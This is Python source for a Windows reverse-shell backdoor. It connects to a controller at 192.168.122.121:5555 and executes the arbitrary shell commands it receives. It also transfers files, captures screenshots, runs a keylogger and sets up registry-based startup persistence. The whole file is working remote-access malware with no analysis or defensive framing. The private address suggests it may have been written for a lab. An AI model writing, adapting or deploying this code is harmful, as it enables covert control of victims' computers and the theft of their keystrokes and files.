import json
import os
import socket
import subprocess
import threading
import pyautogui
import keylogger
import shutil
import sys
from termcolor import colored
import time


def send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def receive():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(file_name):
    file = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        file.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    file.close()


def upload_file(file_name):
    file = open(file_name, 'rb')
    s.send(file.read())


def screenshot():
    screen = pyautogui.screenshot()
    screen.save('screen.png')


def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + f'\\ {copy_name}'
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(f'reg add HKCU\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run /v {reg_name} /t REG_SZ /d "{file_location}"', shell=True)
            send(colored(f'[^_^] Created persistence with Reg key: {reg_name} ', 'blue'))
        else:
            send(colored('[^_^] Persistence already exists! ', 'blue'))
    except:       
        send(colored('[-_-] Error creating persistence.', 'red'))


def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('192.168.122.121', 5555))
            shell()
            s.close()
            break
        except:
            connection()


def shell():
    while True:
        command = receive()
        if command == 'quit':
            break
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command[:12] == 'keylog_start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            send('[^_^] Keylogger started!!!')
        elif command[:11] == 'keylog_dump':
            logs = keylog.read_logs()
            send(logs)
        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            send('[0_0] Keylogger stopped...')
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split('')
            persist(reg_name, copy_name)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            send(result.rstrip())


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()